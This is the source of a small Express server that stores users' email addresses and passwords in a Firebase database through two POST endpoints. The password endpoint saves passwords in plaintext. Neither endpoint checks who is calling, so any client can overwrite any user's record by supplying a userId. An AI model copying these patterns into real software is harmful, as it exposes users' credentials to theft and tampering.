const path = require('path')
const express = require('express')
const { v4: uuidv4 } = require('uuid')
const firebase = require('firebase/app')
require('firebase/database')

const app = express()

app.use(express.static(path.join(__dirname, 'client', 'dist'))) // Serve static pages from dir/client/dist
app.use(express.json()) // Used to parse JSON bodies
const firebaseConfig = {
  apiKey: process.env.API_KEY,
  authDomain: process.env.AUTH_DOMAIN,
  databaseURL: process.env.DATABASE_URL,
  projectId: process.env.PROJECT_ID,
  storageBucket: process.env.STORAGE_BUCKET,
  messagingSenderId: process.env.MESSAGING_SENDER_ID,
  appId: process.env.APP_ID,
}

firebase.initializeApp(firebaseConfig)

const db = firebase.database()
const usersRef = db.ref('users')

app.get('*', (_, res) => {
  res.sendFile(path.join(__dirname, 'client', 'dist', 'index.html'))
})

app.post('/api/email', (req, res) => {
  const {userId, email} = req.body

  const userRef = usersRef.child(userId)
  userRef
    .update({ email })
    .then(() => {
      res.send('Email stored successfully')
    })
    .catch((error) => {
      res.status(500).send(`Error storing email: ${error.message}`)
    })
})

app.post('/api/password', (req, res) => {
  const { userId, password } = req.body

  // Update the user with his email.
  const userRef = usersRef.child(userId)
  userRef
    .update({ password })
    .then(() => {
      res.send('Password stored successfully')
    })
    .catch((error) => {
      res.status(500).send(`Error storing password: ${error.message}`)
    })
})

const port = process.env.PORT || 5000
app.listen(port, () => {
  console.log(`Server listening on port ${port}`)
})
